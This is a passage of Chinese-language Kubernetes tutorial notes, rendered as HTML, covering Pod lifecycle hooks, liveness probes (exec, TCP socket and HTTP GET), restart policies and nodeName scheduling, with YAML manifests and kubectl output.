class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-hook-exec</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main-container</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">lifecycle:</span></span><br><span class="line">      <span class="attr">postStart:</span> </span><br><span class="line">        <span class="attr">exec:</span> <span class="comment"># 在容器启动的时候执行一个命令，修改掉nginx的默认首页内容</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo postStart... &gt; /usr/share/nginx/html/index.html&quot;</span>]</span><br><span class="line">      <span class="attr">preStop:</span></span><br><span class="line">        <span class="attr">exec:</span> <span class="comment"># 在容器停止之前停止nginx服务</span></span><br><span class="line">          <span class="attr">command:</span> [<span class="string">&quot;/usr/sbin/nginx&quot;</span>,<span class="string">&quot;-s&quot;</span>,<span class="string">&quot;quit&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-hook-exec.yaml</span><br><span class="line">pod/pod-hook-exec created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods  pod-hook-exec -n dev -o wide</span><br><span class="line">NAME           READY   STATUS     RESTARTS   AGE    IP            NODE    </span><br><span class="line">pod-hook-exec  1/1     Running    0          29s    10.244.2.48   node2   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问pod</span></span><br><span class="line">[root@k8s-master01 ~]# curl 10.244.2.48</span><br><span class="line">postStart...</span><br></pre></td></tr></table></figure><h3 id="5-3-4-容器探测"><a href="#5-3-4-容器探测" class="headerlink" title="5.3.4 容器探测"></a>5.3.4 容器探测</h3><p>容器探测用于检测容器中的应用实例是否正常工作，是保障业务可用性的一种传统机制。如果经过探测，实例的状态不符合预期，那么kubernetes就会把该问题实例” 摘除 “，不承担业务流量。kubernetes提供了两种探针来实现容器探测，分别是：</p><ul><li>liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s会重启容器</li><li>readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s不会转发流量</li></ul><blockquote><p>livenessProbe 决定是否重启容器，readinessProbe 决定是否将请求转发给容器。</p></blockquote><p>上面两种探针目前均支持三种探测方式：</p><ul><li><p>Exec命令：在容器内执行一次命令，如果命令执行的退出码为0，则认为程序正常，否则不正常</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span></span><br><span class="line">  <span class="attr">livenessProbe:</span></span><br><span class="line">    <span class="attr">exec:</span></span><br><span class="line">      <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/tmp/healthy</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li><li><p>TCPSocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span>      </span><br><span class="line">  <span class="attr">livenessProbe:</span></span><br><span class="line">    <span class="attr">tcpSocket:</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li><li><p>HTTPGet：调用容器内Web应用的URL，如果返回的状态码在200和399之间，则认为程序正常，否则不正常</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">……</span></span><br><span class="line">  <span class="attr">livenessProbe:</span></span><br><span class="line">    <span class="attr">httpGet:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span> <span class="comment">#URI地址</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">80</span> <span class="comment">#端口号</span></span><br><span class="line">      <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">#主机地址</span></span><br><span class="line">      <span class="attr">scheme:</span> <span class="string">HTTP</span> <span class="comment">#支持的协议，http或者https</span></span><br><span class="line"><span class="string">……</span></span><br></pre></td></tr></table></figure></li></ul><p>下面以liveness probes为例，做几个演示：</p><p><strong>方式一：Exec</strong></p><p>创建pod-liveness-exec.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-liveness-exec</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">exec:</span></span><br><span class="line">        <span class="attr">command:</span> [<span class="string">&quot;/bin/cat&quot;</span>,<span class="string">&quot;/tmp/hello.txt&quot;</span>] <span class="comment"># 执行一个查看文件的命令</span></span><br></pre></td></tr></table></figure><p>创建pod，观察效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml</span><br><span class="line">pod/pod-liveness-exec created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev</span><br><span class="line">......</span><br><span class="line">  Normal   Created    20s (x2 over 50s)  kubelet, node1     Created container nginx</span><br><span class="line">  Normal   Started    20s (x2 over 50s)  kubelet, node1     Started container nginx</span><br><span class="line">  Normal   Killing    20s                kubelet, node1     Container nginx failed liveness probe, will be restarted</span><br><span class="line">  Warning  Unhealthy  0s (x5 over 40s)   kubelet, node1     Liveness probe failed: cat: can&#x27;t open &#x27;/tmp/hello11.txt&#x27;: No such file or directory</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察上面的信息就会发现nginx容器启动之后就进行了健康检查</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查失败之后，容器被<span class="built_in">kill</span>掉，然后尝试进行重启（这是重启策略的作用，后面讲解）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev</span><br><span class="line">NAME                READY   STATUS             RESTARTS   AGE</span><br><span class="line">pod-liveness-exec   0/1     CrashLoopBackOff   2          3m19s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了......</span></span><br></pre></td></tr></table></figure><p><strong>方式二：TCPSocket</strong></p><p>创建pod-liveness-tcpsocket.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-liveness-tcpsocket</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">tcpSocket:</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span> <span class="comment"># 尝试访问8080端口</span></span><br></pre></td></tr></table></figure><p>创建pod，观察效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml</span><br><span class="line">pod/pod-liveness-tcpsocket created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev</span><br><span class="line">......</span><br><span class="line">  Normal   Scheduled  31s                            default-scheduler  Successfully assigned dev/pod-liveness-tcpsocket to node2</span><br><span class="line">  Normal   Pulled     &lt;invalid&gt;                      kubelet, node2     Container image &quot;nginx:1.17.1&quot; already present on machine</span><br><span class="line">  Normal   Created    &lt;invalid&gt;                      kubelet, node2     Created container nginx</span><br><span class="line">  Normal   Started    &lt;invalid&gt;                      kubelet, node2     Started container nginx</span><br><span class="line">  Warning  Unhealthy  &lt;invalid&gt; (x2 over &lt;invalid&gt;)  kubelet, node2     Liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察上面的信息，发现尝试访问8080端口,但是失败了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev</span><br><span class="line">NAME                     READY   STATUS             RESTARTS   AGE</span><br><span class="line">pod-liveness-tcpsocket   0/1     CrashLoopBackOff   2          3m19s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了......</span></span><br></pre></td></tr></table></figure><p><strong>方式三：HTTPGet</strong></p><p>创建pod-liveness-httpget.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-liveness-httpget</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span>  <span class="comment"># 其实就是访问http://127.0.0.1:80/hello  </span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTP</span> <span class="comment">#支持的协议，http或者https</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">80</span> <span class="comment">#端口号</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/hello</span> <span class="comment">#URI地址</span></span><br></pre></td></tr></table></figure><p>创建pod，观察效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml</span><br><span class="line">pod/pod-liveness-httpget created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod详情</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev</span><br><span class="line">.......</span><br><span class="line">  Normal   Pulled     6s (x3 over 64s)  kubelet, node1     Container image &quot;nginx:1.17.1&quot; already present on machine</span><br><span class="line">  Normal   Created    6s (x3 over 64s)  kubelet, node1     Created container nginx</span><br><span class="line">  Normal   Started    6s (x3 over 63s)  kubelet, node1     Started container nginx</span><br><span class="line">  Warning  Unhealthy  6s (x6 over 56s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404</span><br><span class="line">  Normal   Killing    6s (x2 over 36s)  kubelet, node1     Container nginx failed liveness probe, will be restarted</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观察上面信息，尝试访问路径，但是未找到,出现404错误</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">稍等一会之后，再观察pod信息，就可以看到RESTARTS不再是0，而是一直增长</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev</span><br><span class="line">NAME                   READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-liveness-httpget   1/1     Running   5          3m17s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了......</span></span><br></pre></td></tr></table></figure><p>至此，已经使用liveness Probe演示了三种探测方式，但是查看livenessProbe的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessProbe</span><br><span class="line">FIELDS:</span><br><span class="line">   exec &lt;Object&gt;  </span><br><span class="line">   tcpSocket    &lt;Object&gt;</span><br><span class="line">   httpGet      &lt;Object&gt;</span><br><span class="line">   initialDelaySeconds  &lt;integer&gt;  # 容器启动后等待多少秒执行第一次探测</span><br><span class="line">   timeoutSeconds       &lt;integer&gt;  # 探测超时时间。默认1秒，最小1秒</span><br><span class="line">   periodSeconds        &lt;integer&gt;  # 执行探测的频率。默认是10秒，最小1秒</span><br><span class="line">   failureThreshold     &lt;integer&gt;  # 连续探测失败多少次才被认定为失败。默认是3。最小值是1</span><br><span class="line">   successThreshold     &lt;integer&gt;  # 连续探测成功多少次才被认定为成功。默认是1</span><br></pre></td></tr></table></figure><p>下面稍微配置两个，演示下效果即可：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">root@k8s-master01</span> <span class="string">~</span>]<span class="comment"># more pod-liveness-httpget.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-liveness-httpget</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTP</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">80</span> </span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">      <span class="attr">initialDelaySeconds:</span> <span class="number">30</span> <span class="comment"># 容器启动后30s开始探测</span></span><br><span class="line">      <span class="attr">timeoutSeconds:</span> <span class="number">5</span> <span class="comment"># 探测超时时间为5s</span></span><br></pre></td></tr></table></figure><h3 id="5-3-5-重启策略"><a href="#5-3-5-重启策略" class="headerlink" title="5.3.5 重启策略"></a>5.3.5 重启策略</h3><p>在上一节中，一旦容器探测出现了问题，kubernetes就会对容器所在的Pod进行重启，其实这是由pod的重启策略决定的，pod的重启策略有 3 种，分别如下：</p><ul><li>Always ：容器失效时，自动重启该容器，这也是默认值。</li><li>OnFailure ： 容器终止运行且退出码不为0时重启</li><li>Never ： 不论状态为何，都不重启该容器</li></ul><p>重启策略适用于pod对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由kubelet延迟一段时间后进行，且反复的重启操作的延迟时长以此为10s、20s、40s、80s、160s和300s，300s是最大延迟时长。</p><p>创建pod-restartpolicy.yaml：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-restartpolicy</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx-port</span></span><br><span class="line">      <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">scheme:</span> <span class="string">HTTP</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/hello</span></span><br><span class="line">  <span class="attr">restartPolicy:</span> <span class="string">Never</span> <span class="comment"># 设置重启策略为Never</span></span><br></pre></td></tr></table></figure><p>运行Pod测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml</span><br><span class="line">pod/pod-restartpolicy created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Pod详情，发现nginx容器失败</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev</span><br><span class="line">......</span><br><span class="line">  Warning  Unhealthy  15s (x3 over 35s)  kubelet, node1     Liveness probe failed: HTTP probe failed with statuscode: 404</span><br><span class="line">  Normal   Killing    15s                kubelet, node1     Container nginx failed liveness probe</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">多等一会，再观察pod的重启次数，发现一直是0，并未重启</span>   </span><br><span class="line">[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev</span><br><span class="line">NAME                   READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod-restartpolicy      0/1     Running   0          5min42s</span><br></pre></td></tr></table></figure><h2 id="5-4-Pod调度"><a href="#5-4-Pod调度" class="headerlink" title="5.4 Pod调度"></a>5.4 Pod调度</h2><p>在默认情况下，一个Pod在哪个Node节点上运行，是由Scheduler组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些Pod到达某些节点上，那么应该怎么做呢？这就要求了解kubernetes对Pod的调度规则，kubernetes提供了四大类调度方式：</p><ul><li>自动调度：运行在哪个节点上完全由Scheduler经过一系列的算法计算得出</li><li>定向调度：NodeName、NodeSelector</li><li>亲和性调度：NodeAffinity、PodAffinity、PodAntiAffinity</li><li>污点（容忍）调度：Taints、Toleration</li></ul><h3 id="5-4-1-定向调度"><a href="#5-4-1-定向调度" class="headerlink" title="5.4.1 定向调度"></a>5.4.1 定向调度</h3><p>定向调度，指的是利用在pod上声明nodeName或者nodeSelector，以此将Pod调度到期望的node节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标Node不存在，也会向上面进行调度，只不过pod运行失败而已。</p><p><strong>NodeName</strong></p><p>NodeName用于强制约束将Pod调度到指定的Name的Node节点上。这种方式，其实是直接跳过Scheduler的调度逻辑，直接将Pod调度到指定名称的节点。</p><p>接下来，实验一下：创建一个pod-nodename.yaml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-nodename</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">dev</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:1.17.1</span></span><br><span class="line">  <span class="attr">nodeName:</span> <span class="string">node1</span> <span class="comment"># 指定调度到node1节点上</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建Pod</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml</span><br><span class="line">pod/pod-nodename created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看Pod调度到NODE属性，确实是调度到了node1节点上</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide</span><br><span class="line">NAME           READY   STATUS    RESTARTS   AGE   IP            NODE      ......</span><br><span class="line">pod-nodename   1/1     Running   0          56s   10.244.1.87   node1     ......   </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接下来，删除pod，修改nodeName的值为node3（并没有node3节点）</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml</span><br><span class="line">pod &quot;pod-nodename&quot; deleted</span><br><span class="line">[root@k8s-master01 ~]# vim pod-nodename.yaml</span><br><span class="line">[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml</span><br><span class="line">pod/pod-nodename created</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">再次查看，发现已经向Node3节点调度，但是由于不存在node3节点，所以pod无法正常运行</span></span><br><span class="line">[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide</span><br><span class="line">NAME           READY   STATUS    RESTARTS   AGE   IP       NODE    ......</span><br><span class="line">pod-nodename   0/1     Pending   0          6s    &lt;none&gt;   node3   ......           